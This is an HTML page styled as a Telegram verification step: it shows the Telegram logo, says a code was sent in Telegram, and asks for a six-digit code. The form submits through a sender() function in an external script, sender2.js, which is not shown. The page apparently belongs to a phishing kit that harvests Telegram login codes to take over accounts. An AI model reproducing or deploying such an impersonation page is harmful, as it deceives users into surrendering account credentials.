<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link href="./output.css" rel="stylesheet" />
    <link rel="icon" type="image/png" href="telegram.png">
    <title>Enter Code</title>
  </head>
  <body class="md:bg-gray-50 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-lg md:shadow-lg text-center md:w-[85%] lg:w-[35%] w-full">
      <div class="mx-auto my-auto mb-8">
        <img class="md:w-40 md:h-40 w-20 h-20 mx-auto" src="telegram.png" alt="">
        <p class="text-gray-400 mx-8 mt-2">We have sent you a message in Telegram with the code.</p>
      </div>
      <form id="codeForm" onsubmit="return sender()">
        <div class="mb-4">
          <input type="number" id="code" pattern="\d{6}" name="code" placeholder="Enter code" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" required title="Please enter a 6-digit code."/>
        </div>
        <div>
          <button id="btn" type="submit" class="bg-blue-500 hover:bg-blue-600 text-white py-3 px-4 rounded-lg focus:outline-none focus:shadow-outline mt-4 w-full mb-8">
            Submit
          </button>
        </div>
      </form>
    </div>
    <script src="sender2.js"></script>
  </body>
</html>
